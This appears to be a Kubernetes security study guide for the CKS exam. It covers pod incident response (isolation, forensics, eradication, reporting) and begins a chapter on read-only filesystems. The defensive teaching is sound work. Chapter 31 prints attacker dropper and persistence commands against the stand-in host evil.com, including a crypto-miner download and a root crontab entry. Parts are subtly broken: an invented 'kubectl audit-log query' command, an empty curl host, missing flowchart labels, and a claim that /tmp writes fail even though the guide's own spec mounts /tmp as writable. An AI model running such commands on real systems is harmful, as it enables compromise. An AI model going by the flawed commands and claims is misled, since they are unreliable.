Chapter 30: Detecting and Responding to Security Incidents

Falco just fired: "🚨 Shell spawned in anihpj container!" Audit logs confirm it — an unknown IP exec'd into your Django pod. What do you do RIGHT NOW? This chapter is your incident response playbook for Kubernetes. You'll learn to contain a compromised pod without deleting it (preserving forensic evidence), investigate what the attacker did, eradicate the threat, and recover safely — all while keeping the rest of the cluster operational. This is where all previous chapters converge: audit logs (Ch28) tell you what happened, Falco (Ch29) detected it, and now you respond. Detection without response is just observation. Response without a plan is panic.

🟡 Intermediate ⏱️ ~2 hours 🚨 Incident Response 🔍 Runtime Security

🎯 What You'll Learn — Core-Level Mastery

  • ✅ Incident response lifecycle: The 6-phase model adapted for Kubernetes — Detect → Contain → Investigate → Eradicate → Recover → Learn
  • ✅ Pod isolation techniques: Removing labels, applying emergency NetworkPolicies, and isolating pods without destroying forensic evidence
  • ✅ Forensic investigation: Capturing pod specs, environment variables, running processes, network connections, and filesystem state before deletion
  • ✅ Common attack scenarios: Crypto miner detection, reverse shell response, data exfiltration containment — with step-by-step CKS responses
  • ✅ Post-incident process: Communication protocols, evidence preservation, root cause analysis, and prevention measures

Monitoring, Logging & Runtime Security 20%

30.1 The Incident Response Lifecycle in Kubernetes

Kubernetes incident response follows a 6-phase lifecycle: Detect → Contain → Investigate → Eradicate → Recover → Learn. Unlike traditional server IR, Kubernetes adds unique challenges: pods are ephemeral (delete them and evidence is gone), attackers can move laterally through the ServiceAccount token, and compromised pods can be replaced by Deployments before you investigate.

Incident Response Flowchart — Falco Alert to Resolution

Complete IR Flow — 6 Phases from Detection to Learning
  🚨 ALERT: Falco detects shell in anihpj pod at 03:14:05
       │
       ▼
  ╔══════════════════════════════════════════════════════════════╗
  ║  PHASE 1: DETECT — Confirm the alert is real               ║
  ║  kubectl describe pod anihpj-xxx                            ║
  ║  kubectl logs anihpj-xxx --tail=50                          ║
  ║  → Check: is this a known maintenance task or an attack?   ║
  ╚══════════════════════════════════════════════════════════════╝
       │ ❌ Confirmed: NOT legitimate
       ▼
  ╔══════════════════════════════════════════════════════════════╗
  ║  PHASE 2: CONTAIN — Stop the bleeding                       ║
  ║  Remove pod from Service (kubectl label)                    ║
  ║  Apply emergency deny-all NetworkPolicy                     ║
  ║  → Pod still running but ISOLATED — can't reach/be reached  ║
  ╚══════════════════════════════════════════════════════════════╝
       │
       ▼
  ╔══════════════════════════════════════════════════════════════╗
  ║  PHASE 3: INVESTIGATE — Capture forensic evidence           ║
  ║  kubectl get pod -o yaml > forensic.yaml                    ║
  ║  kubectl exec -- env > env.txt                              ║
  ║  kubectl exec -- ps aux > processes.txt                     ║
  ║  Check audit logs for this SA's activity                    ║
  ╚══════════════════════════════════════════════════════════════╝
       │
       ▼
  ╔══════════════════════════════════════════════════════════════╗
  ║  PHASE 4: ERADICATE — Remove the threat                     ║
  ║  kubectl delete pod anihpj-xxx --force                      ║
  ║  Revoke compromised ServiceAccount token                    ║
  ║  Rotate any secrets the pod had access to                   ║
  ╚══════════════════════════════════════════════════════════════╝
       │
       ▼
  ╔══════════════════════════════════════════════════════════════╗

  ║  Deployment creates clean replacement pod                    ║
  ║  Verify app is healthy and serving traffic                   ║
  ║  Monitor for 24 hours for recurrence                        ║
  ╚══════════════════════════════════════════════════════════════╝
       │
       ▼
  ╔══════════════════════════════════════════════════════════════╗

  ║  Document: incident report, timeline, lessons learned       ║
  ╚══════════════════════════════════════════════════════════════╝

Kubernetes-Specific IR Challenges — Why Traditional IR Fails Here

⚠️ Unique K8s IR Challenges That Break Traditional IR Playbooks

1. Ephemeral pods: Traditional IR says "preserve the server for forensics." In K8s, deleting a pod (even accidentally via Deployment rollback) destroys ALL evidence instantly. 2. Self-healing Deployments: A compromised pod gets killed by a Deployment → a NEW pod spawns → the attacker is back. You must fix the DEPLOYMENT, not just the pod. 3. Lateral movement via SA tokens: The compromised pod's ServiceAccount token can access the API server. An attacker can list pods, read secrets, and deploy new workloads from INSIDE the compromised container. 4. Namespace isolation is weak: By default, pods can reach services in other namespaces. An attacker in namespace "anihpj" can potentially access "kube-system" services. 5. Evidence is distributed: Audit logs, pod logs, node logs, Falco alerts — all in different places. Correlating them manually is hard.

Decision Tree — Isolate vs Delete: Which Action When?

Incident Response Decision — Isolate or Delete?
  🚨 ALERT: Compromised pod detected
  │
  ├─ Is this a PRODUCTION pod serving live traffic?
  │  ├─ YES → Isolate (remove label) + let Deployment create clean replacement
  │  └─ NO (dev/staging) → Isolate for investigation at leisure
  │
  ├─ Do you NEED forensic evidence? (for compliance, legal, or RCA)
  │  ├─ YES → Isolate, capture forensics, THEN delete
  │  └─ NO (clear-cut crypto miner, no data access) → Delete immediately
  │
  ├─ Is the pod actively exfiltrating data RIGHT NOW?
  │  └─ YES → Isolate + apply egress-deny NetworkPolicy FIRST, then investigate
  │
  └─ 🟢 RULE OF THUMB:
     ALWAYS isolate first. You can always delete later.
     You can NEVER recover forensic evidence from a deleted pod.

30.2 Isolating a Compromised Pod Without Deleting It

The worst mistake in Kubernetes IR is deleting the pod before investigating. Once deleted, all forensic evidence — running processes, network connections, environment variables — is gone forever. Instead, isolate first: cut the pod's network, remove it from the Service, but keep it running for investigation.

Emergency Pod Isolation — Step-by-Step Command Sequence

Bash — Isolate compromised pod while preserving forensic evidence 
# STEP 1: Identify the compromised pod
kubectl get pods -n anihpj -o wide
# Note: pod name, IP, node, and container IDs

# STEP 2: Remove pod from Service (stops traffic immediately!)
kubectl label pod anihpj-django-abc123 -n anihpj app-
# Removes the "app" label. Service selectors no longer match.
# Pod stops receiving traffic INSTANTLY.

# STEP 3: Apply emergency deny-all NetworkPolicy
kubectl apply -f - << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: emergency-isolate-compromised
  namespace: anihpj
spec:
  podSelector:
    matchLabels:
      app: anihpj
  policyTypes: [Ingress, Egress]
  # No ingress/egress rules = DENY ALL traffic
EOF

# STEP 4: Verify isolation
kubectl exec anihpj-legit-pod -n anihpj -- \
  curl --connect-timeout 2 http://:8000
# Should FAIL — NetworkPolicy blocks all traffic

Why Not Just kubectl delete? — The Cost of Destroying Evidence

WRONG: Delete Immediately
kubectl delete pod compromised-pod --force

• Pod is GONE in milliseconds
• Deployment creates replacement
• Attacker's processes → GONE
• Attacker's files → GONE
• Network connections → GONE
• You know: nothing about the attack
• Attacker can repeat the same attack
  because root cause is NOT fixed
RIGHT: Isolate → Investigate → Delete
# 1. ISOLATE (Section 30.2)
kubectl label pod pwned app-
kubectl apply -f emergency-deny-all.yaml

# 2. INVESTIGATE (Section 30.3)
kubectl get pod pwned -o yaml > forensic.yaml
kubectl exec pwned -- ps aux > processes.txt
kubectl exec pwned -- env > env.txt

# 3. DELETE (after evidence captured)
kubectl delete pod pwned --force

• You know: what attacker ran, which
  files they touched, where they connected
• Root cause is identified and fixed
• New Falco rules detect this pattern

30.3 Forensic Investigation of a Kubernetes Pod

Before deleting the compromised pod, capture everything. This forensic snapshot is your evidence for root cause analysis, incident reports, and legal/compliance requirements.

Pod Forensics Checklist — Capture Before Deletion

Bash — Complete forensic capture of a compromised pod 
POD=anihpj-django-abc123
NS=anihpj
DIR=forensics-$(date +%Y%m%d-%H%M%S)
mkdir -p $DIR

# 1. Full pod spec (with runtime state, node, IPs)
kubectl get pod $POD -n $NS -o yaml > $DIR/pod-spec.yaml

# 2. Environment variables (may contain leaked secrets!)
kubectl exec $POD -n $NS -- env > $DIR/env.txt

# 3. Running processes
kubectl exec $POD -n $NS -- ps aux > $DIR/processes.txt

# 4. Network connections
kubectl exec $POD -n $NS -- netstat -tunap > $DIR/netstat.txt 2>/dev/null
kubectl exec $POD -n $NS -- ss -tunap > $DIR/ss.txt 2>/dev/null

# 5. Filesystem anomalies (recently modified files, /tmp, /root)
kubectl exec $POD -n $NS -- find /tmp /root /home -type f -mmin -60 > $DIR/recent-files.txt 2>/dev/null
kubectl exec $POD -n $NS -- ls -laR /tmp > $DIR/tmp-listing.txt 2>/dev/null

# 6. Pod logs (may show attacker commands)
kubectl logs $POD -n $NS --tail=500 > $DIR/pod-logs.txt

# 7. Audit log events for this pod's namespace in the attack window
cat /var/log/kubernetes/audit.log | jq "select(.objectRef.namespace==\"$NS\" and .stageTimestamp >= \"03:00:00Z\")" > $DIR/audit-events.json

echo "✅ Forensic evidence saved to $DIR/"

Container Filesystem Snapshot — kubectl cp for Offline Analysis

Bash — Copy suspicious files from pod to local machine for analysis 
# Copy the entire /tmp directory (common malware dropper location)
kubectl cp anihpj/anihpj-django-abc123:/tmp $DIR/tmp-copy/

# Copy suspicious binaries for offline reverse engineering
kubectl cp anihpj/anihpj-django-abc123:/tmp/xmrig $DIR/suspicious-binary

# Copy modified system files (evidence of persistence)
kubectl cp anihpj/anihpj-django-abc123:/etc/crontab $DIR/crontab
kubectl cp anihpj/anihpj-django-abc123:/root/.bash_history $DIR/bash-history

# Copy the full container filesystem (if distroless, this is small)
kubectl cp anihpj/anihpj-django-abc123:/ $DIR/full-fs/ 2>/dev/null
# ⚠️ Only works if tar is available in the container

30.4 Common Attack Scenarios & CKS Responses

Six attack scenarios appear repeatedly on the CKS exam and in real production incidents. Memorize the detection, containment, and eradication steps for each. This table IS your incident response cheat sheet.

Attack → Response Playbook — 6 Common Scenarios (CKS Exam + Real World)

ScenarioDetectionContainmentEradication
🪙 Crypto Miner Falco: "Unexpected outbound connection" to mining pool IPs. Node CPU at 100%. kubectl top pod shows abnormal usage. Isolate pod (Section 30.2), check audit logs for who created it, verify image source Delete pod, revoke creator's SA token, add admission rule blocking unknown images, block mining pool IPs via NetworkPolicy egress rules
🐚 Reverse Shell Falco: "Netcat remote code execution" (nc -e flag). Outbound connection to unusual port (4444, 1337, 31337). Isolate pod immediately, apply egress-deny NetworkPolicy targeting attacker IP, kubectl label pod to remove from Service Delete pod, rotate all secrets the pod could access, audit RBAC, scan image for backdoor
📤 Data Exfiltration Falco: sensitive file read + large outbound transfer (MBs to external IP). Audit log: secret/configmap reads by unexpected SA. Isolate pod, block all egress via NetworkPolicy, check WHAT data was accessed (audit log objectRef), preserve pod for forensics Delete pod, rotate ALL exfiltrated credentials, notify compliance team (GDPR/PCI), legal review if PII was involved
🔑 Privilege Escalation Audit log: ClusterRoleBinding created binding to cluster-admin. Falco: "Launch privileged container" or setuid binary execution. Delete the malicious ClusterRoleBinding IMMEDIATELY, revoke creator's RBAC permissions, audit ALL existing bindings for anomalies Enable NodeRestriction admission plugin, restrict ClusterRoleBinding creation to specific admin users only, enforce PSS Restricted
🔐 Secret Access by Unexpected SA Audit log: jq 'select(.objectRef.resource=="secrets" and .verb=="get" or .verb=="list")'. SA from dev namespace accessing prod secrets. Immediately delete the SA token (kubectl delete secret ), remove SA from any RoleBindings in the target namespace Rotate all secrets in the accessed namespace, implement namespace-scoped RBAC (never cross-namespace access), audit all SA permissions
🔄 Lateral Movement (Pod→Pod) Falco: outbound connection from compromised pod to other pods on unusual ports. NetworkPolicy violation logs. kubectl exec from unexpected source IPs in audit logs. Apply emergency default-deny NetworkPolicy in the namespace, isolate both source and target pods, check if SA token was used to list other pods via API Implement strict default-deny NetworkPolicy (only allow known traffic), namespace isolation, mTLS via service mesh (Istio/Linkerd) for pod-to-pod auth

Incident Severity Classification — When to Escalate

SeverityCriteriaResponse TimeWho to Notify
🔴 P1 — CriticalActive data exfiltration, cluster-admin compromise, production outage caused by attackImmediate (page on-call)Security lead, DevOps lead, CISO, Legal (if data breach)
🟠 P2 — HighSuspicious pod running, privilege escalation attempt detected, crypto miner in non-prodWithin 1 hourSecurity team, namespace owner, DevOps on-call
🟡 P3 — MediumFailed attack probes (401/403 storms), policy violation without exploitation, new CVE in stagingWithin 24 hoursSecurity team (during business hours)
🟢 P4 — LowInformational: routine security events, scan results with no new criticals, weekly compliance reportNext business dayAutomated dashboard, weekly review

30.5 Incident Response Communication & Post-Mortem

Technical response is half the battle. Communication and learning close the loop. Every incident should produce: a timeline, a root cause analysis, and prevention measures.

Post-Incident Actions — What to Do After the Attack Is Contained

1Write the timeline

Document every event with timestamps from audit logs and Falco alerts. This is your incident report.

2Root cause analysis

How did the attacker get in? Stolen SA token? Unpatched CVE? Misconfigured RBAC? Find and fix the root cause.

3Rotate all affected credentials

Any secret or SA token the compromised pod could access must be rotated. Assume compromise of all accessible data.

4Update detection rules

Add Falco rules for the specific attack pattern. Update audit policy if gaps were found.

5Update prevention controls

Strengthen RBAC, add admission policies, improve network segmentation based on lessons learned.

Evidence Chain of Custody — Preserving Forensic Integrity

Bash — Cryptographic hashes + encryption for chain of custody 
# After capturing all forensic data (Section 30.3):
cd $DIR
sha256sum * > chain-of-custody.sha256
gpg --sign --armor chain-of-custody.sha256   # Sign to prove integrity
tar czf anihpj-incident-20260614.tar.gz $DIR/
gpg --encrypt --recipient security@anihpj.com anihpj-incident-20260614.tar.gz
# Store in secure, access-controlled S3 bucket: anihpj-forensics

Chain of custody is critical if the incident requires legal action or compliance reporting.

📋 Kubernetes Security Incident Report Template

Every security incident must produce a written report. This template covers everything auditors, compliance officers, and insurance providers will ask for. Fill this out within 24 hours of incident resolution.

Markdown — Kubernetes Security Incident Report Template 
# Kubernetes Security Incident Report

## Incident Metadata
| Field | Value |
|-------|-------|
| **Incident ID** | INC-2026-0614-001 |
| **Severity** | P1 (Critical) / P2 (High) / P3 (Medium) / P4 (Low) |
| **Status** | Investigating / Contained / Resolved / Closed |
| **Detected By** | Falco alert / Audit log analysis / Manual review |
| **Detection Time** | 2026-06-14 03:14:05 UTC |
| **Resolution Time** | 2026-06-14 03:45:00 UTC |
| **Duration** | 31 minutes |
| **Reporter** | Name / Team |

## Affected Resources
| Resource | Namespace | Name | Impact |
|----------|-----------|------|--------|
| Pod | anihpj-prod | anihpj-django-abc123 | Compromised — shell access |
| Secret | anihpj-prod | anihpj-db-creds | Potentially read by attacker |
| ServiceAccount | anihpj-prod | anihpj-deployer | Token used to create malicious pod |

## Timeline (UTC)
| Time | Event | Source |
|------|-------|--------|
| 03:14:01 | Pod "crypto-miner" created in anihpj namespace | Audit log |
| 03:14:05 | Falco: "Terminal shell in container" alert for anihpj | Falco alert |
| 03:14:08 | On-call engineer acknowledged alert | PagerDuty |
| 03:14:12 | kubectl exec detected in audit log (source IP 203.0.113.42) | Audit log |
| 03:14:15 | Pod isolated via label removal + NetworkPolicy | kubectl commands |
| 03:14:30 | Forensic capture completed | Section 30.3 checklist |
| 03:15:00 | Pod deleted, SA token revoked | kubectl commands |
| 03:15:30 | All secrets in anihpj namespace rotated | kubectl + vault |
| 03:20:00 | Root cause: compromised CI token used to deploy attacker image | RCA |
| 03:45:00 | New admission policy deployed blocking unverified images | OPA push |

## Root Cause Analysis
**What happened:** An attacker obtained the CI/CD service account token
(from a leaked .env file committed to a public repo). The token had
"create pods" permission in the anihpj namespace. The attacker used
kubectl with this token to deploy a pod running a crypto miner image.

**Why it happened:** (1) SA token stored in .env and committed to public
GitHub. (2) CI SA had overly broad permissions (create pods — not needed
for CI). (3) No admission control blocked images from untrusted registries.
(4) readOnlyRootFilesystem was not enforced on the created pod.

## Actions Taken
| Phase | Action | Status |
|-------|--------|--------|
| Containment | Pod isolated via label removal + NetworkPolicy | ✅ Done |
| Containment | SA token revoked | ✅ Done |
| Eradication | Compromised pod deleted | ✅ Done |
| Eradication | All secrets in anihpj namespace rotated | ✅ Done |
| Recovery | New CI SA created with minimal permissions | ✅ Done |
| Recovery | Admission policy blocking untrusted registries deployed | ✅ Done |
| Prevention | .env files added to .gitignore, repo scanned for secrets | ✅ Done |
| Prevention | Falco rule added for crypto miner detection | ✅ Done |
| Prevention | readOnlyRootFilesystem enforced via Kyverno policy | 🔲 Pending |

## Lessons Learned
1. CI tokens should have MINIMAL permissions — never "create pods" unless absolutely needed
2. All images must come from approved registries — enforced at admission
3. `readOnlyRootFilesystem: true` would have prevented the crypto miner binary write
4. Audit log shipping to SIEM enabled rapid timeline reconstruction
5. Falco detected the shell within 4 seconds — runtime detection works

## Approvals
| Role | Name | Signature | Date |
|------|------|-----------|------|
| Incident Responder | [Name] | | |
| Security Lead | [Name] | | |
| DevOps Lead | [Name] | | |
| CISO (if PII/data breach) | [Name] | | |

Lifecycle (30.1)

6 phases. Detect → Contain → Investigate → Eradicate → Recover → Learn. Never delete a pod before capturing forensic evidence.

💡 Key Takeaway for the CKS Exam

The CKS exam may present an incident scenario and ask you to respond. Know: (1) Never delete first: isolate with labels + NetworkPolicy, capture forensics, THEN delete. (2) Forensic capture: kubectl get pod -o yaml, kubectl exec -- env, kubectl exec -- ps aux, kubectl logs, audit log queries. (3) Containment: remove pod labels to drop from Service, apply emergency deny-all NetworkPolicy. (4) Eradication: delete pod, revoke SA token, rotate secrets. (5) Post-incident: document timeline, root cause analysis, update Falco rules and admission policies.

📝 Chapter 30 — CKS Practice Questions

Q1
A suspicious pod 'crypto-miner-abc' is running in namespace 'prod'. Walk through the incident response steps.
Show Answer
Answer

1. Identify: kubectl describe pod crypto-miner-abc -n prod — check image, command, node. 2. Isolate: kubectl label pod crypto-miner-abc -n prod app- (remove label). Apply deny-all NetworkPolicy in prod namespace. 3. Forensics: kubectl get pod crypto-miner-abc -n prod -o yaml > forensics.yaml; kubectl logs crypto-miner-abc -n prod > forensics.log. 4. Eradicate: kubectl delete pod crypto-miner-abc -n prod. 5. Recover: Deploy clean replacement pod. 6. Lessons: Review how the pod was created (RBAC audit), tighten ImagePolicyWebhook.

Q2
How do you create an emergency deny-all NetworkPolicy to isolate a namespace during an incident?
Show Answer
Answer
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: emergency-deny-all
  namespace: prod
spec:
  podSelector: {}      # All pods
  policyTypes:
  - Ingress
  - Egress
  # No ingress/egress rules = deny all

This blocks ALL ingress and egress traffic for all pods in the namespace. Apply with: kubectl apply -f deny-all.yaml. This is the fastest way to contain a compromised namespace.

Q3
What is the difference between contain, eradicate, and recover in the NIST incident response framework as applied to Kubernetes?
Show Answer
Answer

Contain: Stop the bleeding WITHOUT destroying evidence. Apply NetworkPolicy, cordon node, revoke SA tokens. Eradicate: Remove the attacker's foothold. Delete compromised pods, SAs, backdoor RBAC. Rotate all secrets. Recover: Restore normal operations. Deploy clean replacements from signed images. Verify monitoring is active. On the CKS exam: cordon+drain+NetworkPolicy = contain. Delete pod + rotate secrets = eradicate. Redeploy = recover.

Explanation

The order matters. Contain FIRST (stop damage), then forensics (gather evidence), then eradicate (remove threat), then recover (return to normal). On the CKS exam, always contain before doing anything else — isolated pods can't cause more damage while you investigate.

Q4
A pod is compromised. What forensic evidence do you collect BEFORE deleting it? List the specific commands.
Show Answer
Answer
kubectl get pod <pod> -n <ns> -o yaml > forensic-pod.yaml
kubectl describe pod <pod> -n <ns> > forensic-describe.txt
kubectl logs <pod> -n <ns> --all-containers --tail=1000 > forensic-logs.txt
kubectl exec <pod> -n <ns> -- ps auxww > forensic-ps.txt
kubectl exec <pod> -n <ns> -- netstat -tlnp > forensic-net.txt
kubectl exec <pod> -n <ns> -- cat /proc/1/cgroup > forensic-cgroup.txt
# Check node for escaped processes
ssh <node> "ps aux | grep <container-id>"
Explanation

Forensics before eradication is exam-critical. Once you delete the pod, you lose the running state. Pod YAML gives the spec, logs show what happened, exec shows running processes and network connections. On the CKS exam, always collect forensics before deleting anything.

Q5
After containing a compromised pod, what RBAC changes do you make to prevent the attacker from creating new pods with the same compromised ServiceAccount?
Show Answer
Answer
kubectl delete sa compromised-sa -n prod
kubectl delete rolebinding <name> -n prod
kubectl delete clusterrolebinding <name>
kubectl create sa replacement-sa -n prod  # New SA with new token
kubectl create token replacement-sa -n prod | kubectl create secret generic new-token --from-file=token=/dev/stdin -n prod

Also check for backdoor ClusterRoleBindings: kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.namespace=="prod")'.

Explanation

ServiceAccount token rotation is critical after a compromise. Simply deleting the pod isn't enough — if the attacker copied the token, they can still authenticate. Deleting the SA invalidates all existing tokens. On the CKS exam, always delete compromised SAs and rotate secrets.

Q6
An attacker deployed a DaemonSet across all nodes. You need to remove it urgently. What's the fastest command sequence?
Show Answer
Answer
kubectl delete daemonset <name> -n <ns> --force --grace-period=0
kubectl delete pods -n <ns> -l app=<malicious-label> --force --grace-period=0
# Verify cleanup
kubectl get pods -A | grep -i <malicious-pattern>
Explanation

--force --grace-period=0 immediately deletes without waiting for graceful shutdown. For a DaemonSet, deleting the DaemonSet resource cascades to delete all its pods. On the CKS exam, speed matters in incident response — use force flags during containment but always collect forensics first.

Q7
What command shows you ALL recent activity in a compromised namespace? How do you check who created a malicious pod?
Show Answer
Answer
kubectl get events -n prod --sort-by='.lastTimestamp' | tail -20
kubectl audit-log query --namespace=prod --since=1h  # If audit logging is configured
cat /var/log/kubernetes/audit.log | jq 'select(.objectRef.namespace=="prod") | {time: .stageTimestamp, user: .user.username, verb, resource: .objectRef.resource, name: .objectRef.name}'
Explanation

Events show WHAT happened. Audit logs show WHO did it. On the CKS exam, if audit logging is enabled, always query it first. Events are ephemeral (1-hour retention by default) — audit logs are permanent (if configured).

Q8
What's the difference between cordon and drain? When would you use each during incident response?
Show Answer
Answer

Cordon: Marks node as unschedulable — no NEW pods, but EXISTING pods keep running. Use when you want to preserve evidence (don't kill compromised pods yet). Drain: Evicts ALL pods from the node. Use after forensics are collected to move legitimate workloads off a compromised node. During IR: cordon first (preserve evidence), investigate, then drain (move good pods), then isolate the node for deep forensics.

Explanation

Cordon is containment without destruction. Drain is relocation. On the CKS exam, never drain before collecting forensics — you'll destroy evidence. Cordon → investigate → drain → isolate node.

Q9
After an incident, you need to rotate ALL secrets in a namespace. What's the most efficient approach?
Show Answer
Answer
# List all secrets
kubectl get secrets -n prod
# For static secrets: delete and recreate
kubectl delete secret db-password api-key -n prod
kubectl create secret generic db-password --from-literal=password=<new-value> -n prod
# For TLS secrets: generate new certs
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout new.key -out new.crt -subj "/CN=new.anihpj.com"
kubectl delete secret tls-cert -n prod
kubectl create secret tls tls-cert --cert=new.crt --key=new.key -n prod
# Restart pods to pick up new secrets
kubectl rollout restart deployment -n prod
Explanation

Post-incident secret rotation is mandatory. If the attacker exfiltrated secrets, they still have the old values. On the CKS exam, always include secret rotation in the recovery phase. For external secret stores (Vault), rotate at the source — the External Secrets Operator will sync the new values.

Q10
Design an incident response runbook for a "pod running cryptocurrency miner" alert from Falco. Include all phases with specific commands.
Show Answer
Answer
1
Verify

kubectl top pod <pod> -n prod — crypto miners use 100% CPU. kubectl describe pod — check image.

2
Contain

kubectl apply -f emergency-deny-all.yaml -n prod. kubectl cordon <node> if all-node.

3
Forensics

Save pod YAML, logs, ps output, env vars. Check audit logs for who created it.

4
Eradicate

Delete pod, SA, RBAC bindings. Remove malicious image from registry if pushed.

5
Recover

Deploy replacement, rotate secrets, verify monitoring, document lessons learned.

Explanation

This runbook demonstrates the complete CKS IR workflow. The key: verify (confirm it's real), contain (stop damage), forensics (preserve evidence), eradicate (remove threat), recover (return to normal). On the exam, you'll be given one of these phases and expected to execute the correct commands.

🔁 Muscle Memory Drills — Practice Until Automatic
# 1. Contain a compromised namespace (EXAM PATTERN)
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: emergency-deny-all
  namespace: <compromised-ns>
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]
EOF

# 2. Capture forensic evidence
kubectl get pod <compromised-pod> -o yaml > forensics-pod.yaml
kubectl logs <compromised-pod> --tail=500 > forensics-logs.txt
kubectl exec <compromised-pod> -- ps aux > forensics-ps.txt
kubectl exec <compromised-pod> -- env > forensics-env.txt

# 3. Check audit log for suspicious activity
cat /var/log/kubernetes/audit.log | jq 'select(.objectRef.namespace=="compromised")'

# 4. Eradicate and recover
kubectl delete pod <compromised-pod>
kubectl delete sa <compromised-sa>  # Revoke SA tokens
# Rotate all secrets in the namespace
⚠️ Exam Gotchas — Ch 30 Traps
  • NEVER delete first: Deleting the compromised pod destroys forensic evidence. Always: (1) isolate, (2) capture forensics, (3) THEN delete. If the exam asks you to "respond to an incident," the first command should NOT be kubectl delete.
  • deny-all NetworkPolicy also blocks DNS: If you apply a deny-all egress NetworkPolicy, pods can't reach CoreDNS. They become completely isolated (can't resolve anything). This is intentional for containment but may break legitimate sidecars.

2FORENSICS (5 min): kubectl get pod -o yaml, kubectl logs, kubectl exec -- ps aux, kubectl exec -- env, audit log queries.

  • Deny-all blocks DNS: Pods can't reach CoreDNS. Intentional for containment but breaks sidecars.

Chapter 31: Immutable Containers — Read-Only Filesystems

An attacker gets a shell inside your anihpj container. What's the first thing they do? Write to disk. They download a crypto miner to /tmp/, modify /etc/crontab for persistence, replace /usr/bin/python3 with a backdoored version. Every one of these attacks requires a writable filesystem. Immutable containers flip this: the root filesystem is read-only. Nothing can be written, modified, or deleted — not even by root. If an attacker gets in, they're trapped in a container where every write fails. The pod becomes a self-cleaning sandbox: restart it, and it's back to the original image. Immutability doesn't prevent the initial breach — it makes the breach irrelevant.

🟢 Beginner-Friendly ⏱️ ~1 hour 🧊 Immutability 🔍 Runtime Security

🎯 What You'll Learn — Core-Level Mastery

  • ✅ Why immutability is a security property: How read-only filesystems neutralize post-exploitation attacks — malware installation, persistence, binary replacement
  • ✅ Enforcing read-only filesystems: The readOnlyRootFilesystem: true securityContext, handling writable directories with emptyDir and PVC volumes
  • ✅ Pod Security Standards for immutability: How the Restricted PSS profile enforces read-only filesystems, and how to configure writable exceptions properly
🎓 CKS Relevance
Monitoring, Logging & Runtime Security 20%

31.1 Why Immutability Is a Security Property

An attacker who can write to the container filesystem can: replace binaries with backdoored versions, write malware to /etc/cron.d, modify configuration to open backdoors, and achieve persistence — surviving pod restarts. An immutable container's filesystem is read-only: nothing can change, ever. Changes must go through the CI/CD pipeline and image rebuild.

Read-Write vs Read-Only — The Security Difference

❌ WRITABLE FILESYSTEM
Attacker gets shell:
→ wget http://evil.com/malware   ✅ Downloads
→ chmod +x malware                ✅ Executable
→ ./malware                       ✅ Runs (backdoor!)
→ echo "*/5 * * * * cmd" > cron  ✅ Persistence
→ mv /usr/bin/python3 backdoor    ✅ Binary replaced

Result: PERSISTENT breach
Pod restart = STILL infected
(malware survives in the writable layer)
✅ READ-ONLY FILESYSTEM
Attacker gets shell:
→ wget http://evil.com/malware   ❌ FAIL (EACCES)
→ chmod +x malware                ❌ FAIL (EROFS)
→ ./malware                       ❌ Not downloaded
→ echo "cmd" > /etc/crontab       ❌ FAIL (EROFS)
→ mv /usr/bin/python3 backdoor    ❌ FAIL (EROFS)

Result: ZERO PERSISTENCE
Pod restart = clean image
Attack survived 0 seconds

Immutability doesn't prevent the breach — it makes the breach SURVIVABLE. The attacker can run commands in memory, but nothing persists to disk.

How Container Filesystem Layers Work — Why readOnlyRootFilesystem Matters

Every container has a layered filesystem (OverlayFS). The image layers are read-only and shared across containers. On top, there's a thin writable layer (the "container layer"). This is where all runtime writes go — and it's what readOnlyRootFilesystem: true disables:

OverlayFS — Container Filesystem Layers
  ┌─────────────────────────────────┐
  │  CONTAINER WRITABLE LAYER       │  ← readOnlyRootFilesystem DISABLES this
  │  (all runtime writes go here)   │     No writes = no persistence
  ├─────────────────────────────────┤
  │  IMAGE LAYER 3: Application     │  ← COPY . /app
  ├─────────────────────────────────┤
  │  IMAGE LAYER 2: Dependencies    │  ← pip install -r requirements.txt
  ├─────────────────────────────────┤
  │  IMAGE LAYER 1: Base OS         │  ← FROM python:3.12-slim
  └─────────────────────────────────┘

  🔑 Writable layer is EMPTY on pod start. All modifications exist only
     in this layer. readOnlyRootFilesystem makes this layer read-only.

🔴 ATTACK SCENARIO: Crypto Miner Persistence via Writable Filesystem

ATTACK SCENARIO How a Writable Filesystem Enables Persistent Malware
1
Initial Access

Attacker exploits a CVE in Django, gets RCE inside container as UID 1000.

2
Dropper

With writable FS: wget http://evil.com/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig → SUCCESS. Crypto miner binary is now on disk.

3
Persistence

echo "@reboot /tmp/xmrig" >> /var/spool/cron/crontabs/root → SUCCESS. Miner will restart on container restart.

4
Evasion

Kubernetes restarts the pod (OOM kill). But the writable layer is part of the container — xmrig is STILL in /tmp. Crontab entry is STILL there. Miner restarts automatically.

🛡️
With readOnlyRootFilesystem: true

Step 2: wget → FAIL (EACCES — can't write to /tmp). No binary. No crontab. Pod restart = IMAGE restart. Attack SURVIVED 0 seconds. Immutability turned a persistent breach into a one-time memory-only incident.

31.2 Enforcing Read-Only Filesystems in Kubernetes

The field is simple: securityContext.readOnlyRootFilesystem: true. One line. But most applications need SOME writable directories — /tmp for temp files, /var/run for PID files, /app/media for Django uploads. The solution: mount emptyDir volumes (ephemeral, deleted with pod) or PersistentVolumeClaims (persistent) at the specific paths that need writes.

anihpj Django — Complete Pod Spec with readOnlyRootFilesystem

YAML — anihpj Django with readOnlyRootFilesystem + writable volume mounts 
apiVersion: v1
kind: Pod
metadata:
  name: anihpj-django
  namespace: anihpj
spec:
  containers:
  - name: anihpj
    image: registry.anihpj.com/anihpj:v2.1.0
    securityContext:
      readOnlyRootFilesystem: true   # 🔐 THE KEY FIELD
      runAsNonRoot: true
      runAsUser: 1000
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
    volumeMounts:
    # ── Writable for temp files (ephemeral) ──
    - name: tmp
      mountPath: /tmp
    # ── Writable for Django media uploads (persistent) ──
    - name: media-uploads
      mountPath: /app/media
    # ── Writable for runtime sockets/PID files ──
    - name: runtime
      mountPath: /var/run
    # ── Writable for Django cache ──
    - name: django-cache
      mountPath: /var/cache/django
  volumes:
  - name: tmp
    emptyDir: {}                  # Ephemeral — deleted with pod
  - name: runtime
